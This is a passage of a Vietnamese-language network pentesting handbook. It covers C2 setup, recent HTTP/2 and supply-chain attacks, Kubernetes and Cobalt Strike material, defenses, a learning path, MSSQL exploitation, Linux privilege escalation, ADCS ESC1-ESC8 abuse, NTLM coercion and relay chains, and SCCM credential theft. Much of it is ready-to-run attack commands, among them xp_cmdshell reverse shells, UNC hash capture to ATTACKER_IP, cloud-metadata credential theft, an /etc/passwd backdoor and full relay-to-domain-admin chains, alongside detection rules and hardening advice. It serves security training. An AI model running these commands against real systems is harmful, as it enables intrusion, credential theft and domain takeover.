# === Vulnerability scanner ===
# OpenVAS/GVM (Kali):
sudo apt install gvm && sudo gvm-setup && sudo gvm-start
# Distro khác: dùng Docker: docker run -d -p 9392:9392 greenbone/gsad
# CLI: gvm-cli (thay thế cho omp đã deprecated)

# === Exploit scripts ===
# ZeroLogon tester: git clone https://github.com/SecuraBV/CVE-2020-1472.git
# PrintNightmare: git clone https://github.com/cube0x0/CVE-2021-1675.git
# krbrelayx/dnstool: pip3 install krbrelayx
```

## 41.2 C2 Frameworks

```bash
# === Sliver ===
# Download từ GitHub releases (recommend):
# https://github.com/BishopFox/sliver/releases
# Hoặc: curl https://sliver.sh/install | sudo bash
# (Verify script trước khi pipe to bash)

# === Havoc ===
# Prerequisites (nhiều dependencies!):
sudo apt install -y git build-essential cmake libfontconfig1 libglib2.0-0 \
  libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev libncurses5-dev \
  libssl-dev libreadline-dev libffi-dev libsqlite3-dev mesa-common-dev \
  qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools libqt5websockets5 \
  libqt5websockets5-dev qtdeclarative5-dev golang-go nasm
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc/teamserver && go build
cd ../client && make
```

---

# PHẦN 42: MODERN ATTACKS (2024-2025)

## 42.1 HTTP/2 Rapid Reset (CVE-2023-44487)

```
Năm: 2023 | Impact: Largest DDoS ever — 398M requests/sec (Google)

Nguyên lý:
HTTP/2 cho phép multiplexing — nhiều streams trong 1 TCP connection.
Attacker mở stream → gửi RST_STREAM ngay lập tức → server vẫn phải process
→ Lặp lại hàng triệu lần/giây

Tại sao nguy hiểm:
- 1 TCP connection = hàng nghìn requests (không cần nhiều IP)
- Server phải allocate resources cho mỗi stream trước khi RST
- Bypass rate limiting truyền thống (dựa trên connection count)

┌────────┐  Stream 1: GET /     ┌────────┐
│ Attack │ ───────────────────> │ Server │  (allocate resources)
│        │  RST_STREAM 1        │        │  (free, but too late)
│        │ ───────────────────> │        │
│        │  Stream 2: GET /     │        │  (allocate again)
│        │ ───────────────────> │        │
│        │  RST_STREAM 2        │        │
│        │ ───────────────────> │        │  ... x 1,000,000/sec
└────────┘                      └────────┘

Defense:
- Limit concurrent streams per connection (SETTINGS_MAX_CONCURRENT_STREAMS)
- Rate limit RST_STREAM frames
- Update web server (nginx ≥ 1.25.3, Apache ≥ 2.4.58)
- CDN/DDoS protection (Cloudflare, AWS Shield)
```

## 42.2 HTTP/2 CONTINUATION Flood (CVE-2024-27316)

```
Năm: 2024 | Affects: Apache, Node.js, Go, nghttp2

Nguyên lý:
HTTP/2 HEADERS frame có thể split thành nhiều CONTINUATION frames
(khi header quá lớn, dùng CONTINUATION để gửi tiếp)
BUG: Server PHẢI buffer TẤT CẢ CONTINUATION frames cho đến khi
nhận được END_HEADERS flag
Attacker gửi CONTINUATION frames KHÔNG BAO GIỜ kết thúc
→ Server buffer grows → memory exhaustion → crash

Defense:
- Limit total HEADERS size
- Timeout HEADERS without END_HEADERS
- Patch: Apache 2.4.59+, Node.js 18.20+/20.12+
```

## 42.3 Supply Chain Attacks via Network

```bash
# === Dependency Confusion ===
# Nguyên lý (Alex Birsan, 2021):
# Company dùng internal package "company-utils" trên private registry
# Attacker publish "company-utils" version 999.0.0 trên public npm/PyPI
# Build system ưu tiên version cao hơn → download malicious package!

# Detection:
# npm: .npmrc → registry=https://private.registry.com
# pip: --index-url https://private.pypi.com --extra-index-url https://pypi.org
# → extra-index-url VẪN vulnerable!

# === Typosquatting ===
# Publish packages với tên gần giống popular packages:
# requests → requets, reqeusts
# lodash → lodahs, l0dash

# Defense:
# Pin exact versions trong lock files
# Use private registry exclusively
# Verify package signatures
# Monitor for new packages matching internal names
```

## 42.4 5G Network Security

```
5G Architecture (vs 4G):
┌─────────────────────────────────────────────────┐
│ 5G Core (SBA - Service-Based Architecture)      │
│ ┌─────┐ ┌─────┐ ┌─────┐ ┌─────┐ ┌─────┐       │
│ │ AMF │ │ SMF │ │ UPF │ │ AUSF│ │ UDM │       │
│ │(Access│(Session│(User │(Auth)│(Data)│       │
│ │Mgmt)  │Mgmt)  │Plane)│     │     │       │
│ └─────┘ └─────┘ └─────┘ └─────┘ └─────┘       │
│ HTTP/2 APIs giữa các NFs (thay thế GTP-C)      │
└─────────────────────────────────────────────────┘

New attack surfaces:
1. Network Slicing: Mỗi "slice" là virtual network riêng
   → Slice isolation bypass = access other tenants
2. SUCI/SUPI: 5G encrypt subscriber identity (fix IMSI catching)
   → Nhưng initial attach vẫn leak thông tin
3. HTTP/2 API between NFs: RESTful → traditional web attacks apply
4. Edge Computing (MEC): Compute at cell tower level
   → New attack surface gần user hơn
5. GTP (GPRS Tunneling): Vẫn dùng trong 5G NSA (Non-Standalone)
   → Legacy GTP attacks still work

Tools:
- SUPI catcher: Upgraded IMSI catchers cho 5G
- 5GC API testing: Standard REST API tools (Burp, Postman)
- Open5GS: Open-source 5G core cho lab testing
```

## 42.5 AI-Powered Attacks & Defenses

```
=== Offensive AI ===
1. AI-generated phishing: LLMs tạo email phishing cực kỳ convincing
   - Personalized based on OSINT
   - Multiple languages, perfect grammar
   - Voice cloning cho vishing attacks

2. ML-based IDS evasion:
   - Adversarial packets: Modify traffic patterns to evade ML classifiers
   - GAN-generated network traffic mimicking legitimate patterns
   - Automated payload mutation

3. AI-assisted exploitation:
   - Automated vulnerability discovery
   - Smart fuzzing với ML feedback loops
   - Auto-generate exploit payloads

=== Defensive AI ===
1. ML Anomaly Detection:
   - Supervised: Train on labeled normal/attack traffic
   - Unsupervised: Detect deviations from baseline (Isolation Forest, Autoencoders)
   - Tools: Elastic ML, Splunk MLTK, Darktrace

2. LLM for Threat Analysis:
   - Auto-triage SIEM alerts
   - Natural language query over security logs
   - Automated incident response playbooks

3. AI-based Network Traffic Analysis:
   - Encrypted traffic classification (without decryption)
   - C2 beacon detection via timing pattern analysis
   - DGA (Domain Generation Algorithm) domain detection
```

## 42.6 EDR/XDR Evasion (Network Perspective)

```bash
# === JA3/JA3S Fingerprinting ===
# TLS Client Hello có fingerprint unique cho mỗi tool
# Default Cobalt Strike/Sliver/Metasploit = known JA3 hashes

# Evasion: Customize TLS fingerprint
# Cobalt Strike: Malleable C2 profile
set sleeptime "30000";
set jitter "20";
http-get {
    set uri "/api/v1/status";
    client {
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
        header "Accept" "application/json";
    }
}

# === Domain Fronting ===
# Gửi HTTPS request đến CDN (allowed domain)
# Host header thực tế trỏ đến C2 server
# CDN forward request → bypass firewall/proxy rules
# Cloudflare, Azure CDN đã block; một số CDN khác vẫn vulnerable

# === ETW Patching ===
# Patch ETW (Event Tracing for Windows) để blind Sysmon/EDR
# Sysmon dựa vào ETW events → patch EtwEventWrite → Sysmon mù
# Không phải network-specific nhưng ảnh hưởng network detection

# === Direct Syscalls ===
# Bypass user-mode API hooks (EDR hook ntdll.dll)
# Call syscalls directly → EDR không thấy network calls
# Tools: SysWhispers3, HellsGate, Halo's Gate
```

## 42.7 Kubernetes Advanced Attacks

```bash
# === RBAC Bypass ===
# Check current permissions
kubectl auth can-i --list
# Overly permissive ClusterRole → escalate to cluster-admin

# === etcd Unauthenticated Access ===
# etcd chứa ALL cluster secrets (unencrypted by default)
# Nếu etcd exposed (port 2379):
etcdctl --endpoints=http://etcd-ip:2379 get / --prefix --keys-only
etcdctl --endpoints=http://etcd-ip:2379 get /registry/secrets/default/

# === Pod → Cloud Metadata ===
# Từ bên trong pod, access cloud metadata:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# → Steal cloud credentials nếu không có network policy block

# === Service Mesh Attacks (Istio) ===
# mTLS bypass: Nếu Istio permissive mode → plaintext vẫn accepted
# Sidecar injection: Inject malicious sidecar → intercept all pod traffic
# Control plane: Compromise istiod → control all service mesh policies

# === Container Escape via Network ===
# CVE-2024-21626 (Leaky Vessels / runc):
# Exploit file descriptor leak → escape container
# Network impact: Escaped container = access host network namespace

# Defense:
# NetworkPolicy restrict pod-to-pod
# PodSecurityPolicy / Pod Security Standards
# Encrypt etcd at rest
# Block metadata endpoint via NetworkPolicy
```

## 42.8 Cobalt Strike Network Signatures

```bash
# === Default Indicators (easy to detect) ===
# Default JA3: 72a589da586844d7f0818ce684948eea
# Default HTTP GET beacon: /pixel, /submit.php, /__utm.gif
# Default named pipe: \\.\pipe\msagent_*
# Default user-agent: "Mozilla/5.0 (compatible; MSIE 9.0...)"
# Beacon interval: Every 60s with 0% jitter

# === Malleable C2 Profile Structure ===
# http-get: Defines GET request format for beacon check-in
# http-post: Defines POST request format for data exfil
# http-stager: Defines initial payload download format
# Customize: URIs, headers, user-agent, body encoding

# === Detection (Blue Team) ===
# Sigma rule: Cobalt Strike default named pipes
title: Cobalt Strike Named Pipe
detection:
  selection:
    EventID: 17    # Sysmon: Pipe Created
    PipeName|startswith:
      - '\msagent_'
      - '\MSSE-'
      - '\postex_'
      - '\status_'

# YARA for network capture:
rule CobaltStrike_Beacon_Config {
    strings:
        $s1 = { 00 01 00 01 00 02 ?? ?? 00 02 00 01 00 02 ?? ?? }
    condition:
        $s1
}

# JA3 detection (Suricata):
# alert tls any any -> any any (ja3.hash; content:"72a589da586844d7f0818ce684948eea"; sid:1;)
```

---

# PHẦN 43: DEFENSE ADDITIONS

> Phòng thủ cho các attack techniques chưa có defense section.

## 43.1 Wireless Attack Defenses

```bash
# === WPA Cracking Defense ===
# Dùng WPA3 nếu devices hỗ trợ
# Password > 12 ký tự, mix case + numbers + special
# Enable 802.11w (PMF - Protected Management Frames)
# Disable WPS (vulnerable to brute force)
# RADIUS/802.1X cho enterprise (thay vì PSK)

# === Evil Twin Defense ===
# 802.1X authentication (certificate-based)
# Wireless IDS (Kismet, Aruba RFProtect)
# Educate users: Verify network before connecting
# MDM policy: Auto-connect only to known SSIDs

# === Bluetooth Defense ===
# Disable Bluetooth khi không dùng
# Non-discoverable mode
# Reject unknown pairing requests
# Update firmware (BLE vulnerabilities patched regularly)
```

## 43.2 Kerberos & AD Attack Defenses

```bash
# === Kerberoasting Defense ===
# Service account passwords > 25 ký tự (random)
# Group Managed Service Accounts (gMSA) — auto-rotate password
# Monitor Event 4769 với RC4 encryption (Phần 34)
# Disable RC4: GPO → Network Security: Configure encryption types

# === AS-REP Roasting Defense ===
# KHÔNG disable Kerberos pre-authentication cho bất kỳ user nào
# Audit: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}

# === Golden Ticket Defense ===
# Reset krbtgt password 2 LẦN (old + new) — mỗi 180 ngày
# Monitor for TGTs with abnormal lifetime
# Privileged Access Workstations (PAW) cho Domain Admins

# === DCSync Defense ===
# Chỉ Domain Controllers mới có Replication rights
# Monitor Event 4662 cho non-DC replication requests (Phần 34)
# Remove unnecessary Replicating Directory Changes permissions

# === General AD Hardening ===
# Tiered admin model (Tier 0/1/2)
# LAPS (Local Admin Password Solution) — random local admin passwords
# Credential Guard (protect LSASS from memory dumping)
# Protected Users group (disable NTLM, delegation, long-term keys)
# AdminSDHolder monitoring

# === PrintNightmare / PetitPotam Defense ===
# Disable Print Spooler trên DCs: Stop-Service Spooler; Set-Service Spooler -StartupType Disabled
# EPA (Extended Protection for Authentication) trên ADCS
# Disable NTLM where possible
```

## 43.3 API Attack Defenses

```bash
# === JWT Defense ===
# KHÔNG accept "alg: none"
# Validate alg header against whitelist
# Use RS256 (asymmetric) thay HS256 cho public APIs
# Short expiration time (15 min)
# Implement token revocation (blacklist)

# === GraphQL Defense ===
# Disable introspection in production
# Query depth limiting (max 5-7 levels)
# Query complexity analysis
# Rate limiting per query, not per request
# Field-level authorization

# === SSRF Defense ===
# Whitelist allowed URLs/IPs for server-side requests
# Block private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x)
# Disable HTTP redirects in server-side requests
# Use metadata service v2 (IMDSv2) — requires PUT token

# === CORS Defense ===
# KHÔNG reflect Origin header blindly
# Whitelist specific origins
# Avoid Access-Control-Allow-Origin: *  với credentials
# Validate Origin server-side, not just via CORS headers

# === HTTP Smuggling Defense ===
# Normalize Content-Length vs Transfer-Encoding handling
# Reject ambiguous requests
# Use HTTP/2 end-to-end (no downgrade)
# WAF rules for smuggling patterns
```

---

# PHẦN 44: CROSS-REFERENCES & LEARNING PATH

## 44.1 Cross-Reference Map

```
Topic                          Primary    Related Sections
───────────────────────────    ────────   ─────────────────────────
ARP Spoofing/MITM              Phần 4.1   → Phần 34 (detection), Phần 9.1 (Scapy)
DNS Attacks                    Phần 4.1   → Phần 29.3 (DNSSEC/DoH), Phần 37.2 (CTF pcap)
Firewall Evasion               Phần 7.7   → Phần 3.1 (nmap evasion)
Wireless                       Phần 8     → Phần 27.2 (advanced wireless), Phần 38.5
SSL/TLS                        Phần 9.2   → Phần 40.2 (cert pinning bypass)
Kerberos                       Phần 14    → Phần 26 (AD attacks), Phần 34 (detection)
Cloud                          Phần 17    → Phần 30 (advanced), Phần 42.7 (K8s)
Monitoring                     Phần 18    → Phần 31, Phần 34 (detection signatures)
Pivoting                       Phần 5.1   → Phần 35 (attack chains)
C2 Frameworks                  Phần 5.4   → Phần 42.6 (EDR evasion), Phần 42.8 (CS sigs)
IPv6                           Phần 25.4  → Phần 9.5 (IPv6 attacks), Phần 42.4 (5G)
```

## 44.2 Network Learning Path

```
Level 1 — Foundations (Tuần 1-4):
  □ OSI Model + TCP/IP Model (Phần 1)
  □ IP addressing + Subnetting (Phần 1, 25.1)
  □ TCP/UDP + Handshakes (Phần 1, 25.3)
  □ DNS, DHCP, ARP (Phần 1)
  □ Basic tools: ping, traceroute, netstat, nmap (Phần 2, 3)
  □ Lab: Dựng VirtualBox + Kali + Metasploitable (Phần 10)

Level 2 — Intermediate (Tuần 5-8):
  □ Wireshark + tcpdump deep dive (Phần 2)
  □ HTTP/HTTPS + TLS (Phần 1, 9.2)
  □ Routing & Switching (VLAN, STP, OSPF) (Phần 11)
  □ Firewall (iptables/nftables) (Phần 7, 33)
  □ Nmap advanced (NSE scripts) (Phần 3)
  □ Lab: TryHackMe Network rooms

Level 3 — Offensive (Tuần 9-14):
  □ MITM attacks (ARP, DNS, SSL strip) (Phần 4)
  □ Password attacks (Hydra, CrackMapExec) (Phần 4.5)
  □ Responder + NTLM relay (Phần 4.6, 26.4)
  □ Proxy: Burp Suite / Charles (Phần 6)
  □ API Security + Bug Bounty (Phần 36)
  □ Lab: HackTheBox Easy machines

Level 4 — Red Team (Tuần 15-20):
  □ Pivoting (SSH, Chisel, Ligolo-ng) (Phần 5.1)
  □ Tunneling (DNS, ICMP, HTTP) (Phần 5.3)
  □ Lateral Movement (PtH, PtT, WinRM) (Phần 5.2)
  □ Kerberos + AD attacks (Phần 14, 26)
  □ C2 Frameworks (Phần 5.4)
  □ Complete Attack Chains (Phần 35)
  □ Lab: HackTheBox Pro Labs (Dante, Offshore)

Level 5 — Expert (Tuần 21+):
  □ Cloud networking + K8s (Phần 17, 30, 42.7)
  □ Blue Team detection (Phần 34)
  □ EDR evasion + modern attacks (Phần 42)
  □ eBPF security (Phần 23)
  □ 5G / IoT security (Phần 42.4, 21)
  □ Cert: OSCP → CRTO → OSEP

What's Next — Beyond Network Security:
  → Web Application Security: OWASP Top 10, Burp Suite mastery
  → Binary Exploitation: Stack overflow, ROP, heap exploitation
  → Malware Analysis: Static + dynamic analysis, reverse engineering
  → Cloud Security: AWS/Azure/GCP pentesting certifications
  → Threat Intelligence: MITRE ATT&CK mapping, threat hunting
```

## 44.3 Cheat Sheet

```
Discover hosts     → nmap -sn 192.168.1.0/24
Scan ports         → nmap -sS -sV -sC -p- target
Web enum           → gobuster/ffuf/nikto
Exploit search     → searchsploit service_version
MITM               → bettercap (arp.spoof + net.sniff)
Password attack    → hydra / netexec (nxc)
Pivot              → ssh -D 1080 / chisel / ligolo-ng
Proxy traffic      → proxychains + socks5
Capture traffic    → tcpdump -i eth0 -w cap.pcap / Wireshark
Firewall           → iptables -A INPUT -p tcp --dport 22 -j ACCEPT
AD enum            → bloodhound-python / PowerView
Kerberoast         → GetUserSPNs.py / Rubeus kerberoast
Credential dump    → mimikatz / secretsdump.py
Lateral move       → psexec.py / evil-winrm / wmiexec.py
C2                 → sliver / havoc
Detection          → Sigma rules + Sysmon + SIEM
```

## 44.4 Resources

```
Books:
- "The TCP/IP Guide" by Charles M. Kozierok (Bible of networking)
- "Hacking: The Art of Exploitation" by Jon Erickson
- "Penetration Testing" by Georgia Weidman
- "Red Team Field Manual" (RTFM)
- "The Hacker Playbook 3" by Peter Kim
- "Network Security Assessment" by Chris McNab

Online:
- TryHackMe: https://tryhackme.com
- HackTheBox: https://hackthebox.com
- OverTheWire: https://overthewire.org (Bandit → Natas → ...)
- PentesterLab: https://pentesterlab.com
- CyberDefenders: https://cyberdefenders.org (Blue team)
- VulnHub: https://vulnhub.com
- PortSwigger Web Academy: https://portswigger.net/web-security

YouTube:
- NetworkChuck
- David Bombal
- IppSec (HackTheBox walkthroughs)
- John Hammond
- The Cyber Mentor

Tools Documentation:
- Nmap: https://nmap.org/book/
- Wireshark: https://www.wireshark.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/web-security
- MITRE ATT&CK: https://attack.mitre.org/
```

---

# PHẦN 45: MSSQL ATTACKS

> **CHỈ DÙNG TRONG AUTHORIZED PENTEST.**

## 45.1 MSSQL Enumeration & Access

```bash
# === Discovery ===
nmap -sV -p 1433 --script ms-sql-info 192.168.1.0/24

# === Connect (Impacket) ===
mssqlclient.py domain/user:password@target -windows-auth
mssqlclient.py sa:password@target                    # SA account

# === Connect (sqsh / sqlcmd) ===
sqsh -S target -U sa -P password
sqlcmd -S target -U sa -P password
```

## 45.2 MSSQL Exploitation

```sql
-- === Enable xp_cmdshell (RCE) ===
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -e <base64_reverse_shell>';

-- === UNC Path Injection (Capture NTLM Hash) ===
-- Trên attacker: sudo responder -I eth0 hoặc smbserver.py
EXEC xp_dirtree '\\ATTACKER_IP\share';
-- Hoặc:
EXEC xp_fileexist '\\ATTACKER_IP\share\file';
-- → Responder/smbserver capture Net-NTLMv2 hash → crack hoặc relay!

-- === Linked Server Exploitation ===
-- Enumerate linked servers
EXEC sp_linkedservers;
-- Execute on linked server (lateral movement!)
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER_NAME];
-- Double hop:
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [THIRD_SERVER]') AT [SECOND_SERVER];

-- === Privilege Escalation ===
-- Impersonate another user
EXECUTE AS LOGIN = 'sa';
EXEC xp_cmdshell 'whoami';
-- Check impersonation rights
SELECT DISTINCT b.name FROM sys.server_permissions a
JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- === Read Files ===
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS Contents;

-- === OLE Automation (alternative RCE) ===
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @cmd INT;
EXEC sp_oacreate 'wscript.shell', @cmd OUTPUT;
EXEC sp_oamethod @cmd, 'run', NULL, 'cmd /c whoami > C:\temp\output.txt';
```

```bash
# === PowerUpSQL (PowerShell module) ===
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain                    # Find SQL instances in domain
Get-SQLServerInfo -Instance target       # Server info
Invoke-SQLAudit -Instance target         # Auto audit
Get-SQLServerLinkCrawl -Instance target  # Crawl linked servers
```

---

# PHẦN 46: LINUX PRIVILEGE ESCALATION

> Tổng hợp có hệ thống — từ enumeration đến exploitation.

## 46.1 Enumeration

```bash
# === System Info ===
uname -a                          # Kernel version → searchsploit
cat /etc/os-release               # Distro + version
hostname && id && whoami

# === SUID Binaries ===
find / -perm -u=s -type f 2>/dev/null
# So sánh với GTFOBins: https://gtfobins.github.io/
# Ví dụ: find, vim, python, bash, nmap, cp có SUID → root

# === Linux Capabilities ===
getcap -r / 2>/dev/null
# cap_setuid+ep trên python3 → root:
# python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# === Sudo Permissions ===
sudo -l
# (ALL) NOPASSWD: /usr/bin/vim → sudo vim -c ':!bash'
# (ALL) NOPASSWD: /usr/bin/find → sudo find . -exec /bin/bash \;
# (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'import os; os.system("/bin/bash")'

# === Cron Jobs ===
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
# Writable script in cron → inject reverse shell

# === Writable Files ===
find / -writable -type f 2>/dev/null | grep -v proc
# /etc/passwd writable → add root user:
echo 'backdoor:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd

# === PATH Hijacking ===
# SUID binary gọi command KHÔNG dùng full path (ví dụ: "service" thay "/usr/sbin/service")
echo '/bin/bash' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
./vulnerable_suid_binary        # Chạy /tmp/service thay vì /usr/sbin/service → root!

# === Automated Tools ===
# LinPEAS:
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# LinEnum:
./LinEnum.sh -t
# pspy (monitor processes without root):
./pspy64
```

## 46.2 Kernel Exploits

```bash
uname -r                          # Kernel version
searchsploit linux kernel $(uname -r | cut -d'-' -f1)
# Compile on attacker (same arch), upload, execute

# Common: DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)
# PwnKit (CVE-2021-4034 - pkexec)
```

## 46.3 Special Groups & Containers

```bash
# === Docker Group ===
id | grep docker
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
# → root on host filesystem!

# === LXD/LXC Group ===
lxc image import alpine.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root
lxc start privesc && lxc exec privesc /bin/sh
# → root on host via /mnt/root

# === Wildcard Injection ===
# Nếu cron chạy: tar czf /backup/backup.tar.gz *
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=bash shell.sh'
# tar interpret filenames starting with -- as flags → execute shell.sh as cron user
```

---

# PHẦN 47: ADCS ESC1-ESC8 & COERCION TECHNIQUES

> Active Directory Certificate Services — tất cả attack vectors.

## 47.1 ADCS Enumeration

```bash
# Certipy (Python — recommended)
certipy find -u user@domain -p password -dc-ip DC_IP -vulnerable
# Output: text + JSON + BloodHound-compatible

# Certify (C# — .NET)
Certify.exe find /vulnerable
```

## 47.2 ADCS ESC1-ESC8

```bash
# ═══ ESC1: Misconfigured Certificate Template ═══
# Điều kiện: Template cho phép requestor specify SAN (Subject Alternative Name)
# + Enrollee có enrollment rights + Manager approval disabled
# → Request cert AS anyone (Domain Admin!)
certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate \
  -upn administrator@domain -dc-ip DC_IP
certipy auth -pfx administrator.pfx -dc-ip DC_IP

# ═══ ESC2: Any Purpose EKU / No EKU ═══
# Template có EKU = "Any Purpose" (OID 2.5.29.37.0) hoặc không có EKU
# → Cert dùng cho BẤT KỲ purpose nào (client auth, code signing, etc.)
# Exploit tương tự ESC1 nếu kết hợp với SAN misconfiguration

# ═══ ESC3: Certificate Request Agent ═══
# Template có EKU = "Certificate Request Agent" (OID 1.3.6.1.4.1.311.20.2.1)
# Step 1: Enroll cho Certificate Request Agent template
# Step 2: Dùng agent cert để request cert ON BEHALF OF another user
certipy req -u user@domain -p password -ca CA-NAME -template AgentTemplate
certipy req -u user@domain -p password -ca CA-NAME -template UserTemplate \
  -on-behalf-of 'domain\administrator' -pfx agent.pfx

# ═══ ESC4: Vulnerable Template ACL ═══
# Attacker có Write permission trên template object
# → Modify template: enable SAN, set enrollment rights → thành ESC1!
certipy template -u user@domain -p password -template VulnTemplate \
  -save-old -dc-ip DC_IP
# (modifies template to be vulnerable, then exploit as ESC1)

# ═══ ESC5: Vulnerable PKI Object ACLs ═══
# Write permission trên CA object, NTAuthCertificates, hoặc PKI containers
# → Có thể add rogue CA, modify trust anchors
# Less common, requires specific AD object permissions

# ═══ ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 on CA ═══
# CA có flag EDITF_ATTRIBUTESUBJECTALTNAME2 enabled
# → BẤT KỲ template nào cũng cho phép specify SAN!
# Check: certutil -config "CA\CA-NAME" -getreg policy\EditFlags
# Exploit: request cert với SAN cho bất kỳ user
certipy req -u user@domain -p password -ca CA-NAME -template User \
  -upn administrator@domain

# ═══ ESC7: Vulnerable CA ACL ═══
# Attacker có ManageCA hoặc ManageCertificates permission trên CA
# ManageCA → enable EDITF_ATTRIBUTESUBJECTALTNAME2 (biến thành ESC6)
# ManageCertificates → approve pending requests
certipy ca -u user@domain -p password -ca CA-NAME -enable-template SubCA
certipy req -u user@domain -p password -ca CA-NAME -template SubCA \
  -upn administrator@domain
# Request bị denied → nhưng ManageCertificates có thể approve:
certipy ca -u user@domain -p password -ca CA-NAME -issue-request REQUEST_ID
certipy req -u user@domain -p password -ca CA-NAME -retrieve REQUEST_ID

# ═══ ESC8: NTLM Relay to ADCS HTTP Enrollment ═══
# ADCS Web Enrollment exposed → relay NTLM auth đến đó → get cert
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController
# Coerce DC to authenticate:
PetitPotam.py attacker-ip dc-ip
# ntlmrelayx captures cert → authenticate as DC!
```

## 47.3 Coercion Techniques (Force Authentication)

```bash
# ═══ PetitPotam (MS-EFSRPC) ═══
# Force target to authenticate to attacker via EFS RPC
PetitPotam.py attacker-ip target-ip              # Unauthenticated (patched in 2021)
PetitPotam.py -u user -p password -d domain attacker-ip target-ip  # Authenticated

# ═══ PrinterBug / SpoolSample (MS-RPRN) ═══
# Force target (with Print Spooler running) to authenticate
SpoolSample.exe target-ip attacker-ip             # C# tool
printerbug.py domain/user:password@target-ip attacker-ip  # Python

# ═══ DFSCoerce (MS-DFSNM) ═══
dfscoerce.py -u user -p password -d domain attacker-ip target-ip

# ═══ ShadowCoerce (MS-FSRVP) ═══
shadowcoerce.py -u user -p password -d domain attacker-ip target-ip

# ═══ Coercer (All-in-one — tests ALL coercion methods) ═══
pip3 install coercer
Coercer coerce -u user -p password -d domain -l attacker-ip -t target-ip
# Tests: PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, và nhiều RPC calls khác

# ═══ Typical Coercion → Relay Chain ═══
# Step 1: Start relay
ntlmrelayx.py -t ldap://dc-ip --delegate-access    # RBCD attack
# Step 2: Coerce target
Coercer coerce -u user -p password -d domain -l attacker-ip -t target-ip
# Step 3: ntlmrelayx creates machine account + sets RBCD
# Step 4: Get service ticket
getST.py -spn cifs/target-ip domain/MACHINE\$:password -impersonate administrator
# Step 5: Use ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain/administrator@target-ip
```

---

# PHẦN 48: SCCM/MECM ATTACKS

> System Center Configuration Manager — heavily deployed in enterprise.
> **CHỈ DÙNG TRONG AUTHORIZED PENTEST.**

```bash
# === Enumeration ===
# Tìm SCCM infrastructure trong AD
# LDAP: OU=System Management hoặc CN=System Management
ldapsearch -x -H ldap://dc-ip -D user@domain -w password \
  -b "CN=System Management,CN=System,DC=domain,DC=com"

# SharpSCCM (C#)
SharpSCCM.exe local site-info          # Get site code, MP, DP
SharpSCCM.exe get site-info -mp SCCM_SERVER

# === Network Access Account (NAA) Credential Extraction ===
# NAA credentials cached on SCCM clients (encrypted with DPAPI)
# SharpSCCM:
SharpSCCM.exe local naa                # Dump NAA creds from local client
# Hoặc từ SCCM database nếu có admin access

# === PXE Boot Media Credential Extraction ===
# SCCM PXE boot có thể chứa credentials
# pxethiefy:
python3 pxethiefy.py 2 SCCM_PXE_SERVER
# Capture PXE boot media → extract task sequence → find embedded credentials

# === CMPivot Abuse ===
# Nếu có SCCM Admin access → CMPivot = remote code execution trên ALL managed devices
# Run arbitrary scripts, queries, file operations on any managed client
# CMPivot query example: Device.Run("whoami")

# === Defense ===
# Restrict SCCM admin roles (principle of least privilege)
# Disable PXE boot media password or use strong passwords
# Monitor NAA credential usage
# Use Enhanced HTTP (no NAA needed)
# Audit CMPivot usage via SCCM logs
```

---

> **Lời khuyên cuối**: Networking là nền tảng của mọi thứ trong security. Đừng vội nhảy vào tools mà chưa hiểu fundamentals. Khi bạn hiểu packet đi từ đâu đến đâu, qua những gì, bạn sẽ tự biết cách exploit và defend. Hãy dựng lab và thực hành. Đọc xong phần nào → làm lab phần đó. Không có shortcut.
